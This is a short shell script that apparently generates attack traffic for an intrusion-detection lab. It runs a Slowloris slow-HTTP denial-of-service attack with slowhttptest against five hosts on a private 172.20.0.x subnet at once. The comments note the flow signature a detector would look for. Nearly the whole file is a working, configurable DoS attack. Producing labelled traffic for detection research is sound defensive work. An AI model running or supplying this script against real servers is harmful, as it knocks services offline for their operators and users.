#!/bin/sh
# slowloris.sh - Slowloris HTTP DoS via slowhttptest against all victim nodes.
# Opens many concurrent connections and sends headers very slowly,
# exhausting the server's connection pool without generating high packet rates.
# Key OIF signature: very long flow_duration_s (>60s), fwd_pkts_per_sec < 1,
# many simultaneous connections from the same source IP.
# All 5 nodes targeted in parallel - realistic subnet-wide slow-HTTP campaign.
CONNS=${1:-200}
DURATION=${2:-120}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] Slowloris -> all nodes  $CONNS connections each  ${DURATION}s"
for ip in $VICTIMS; do
    slowhttptest -c "$CONNS" -H -i 10 -r 50 -t GET -u "http://$ip/" -x 24 -p "$DURATION" &
done
wait
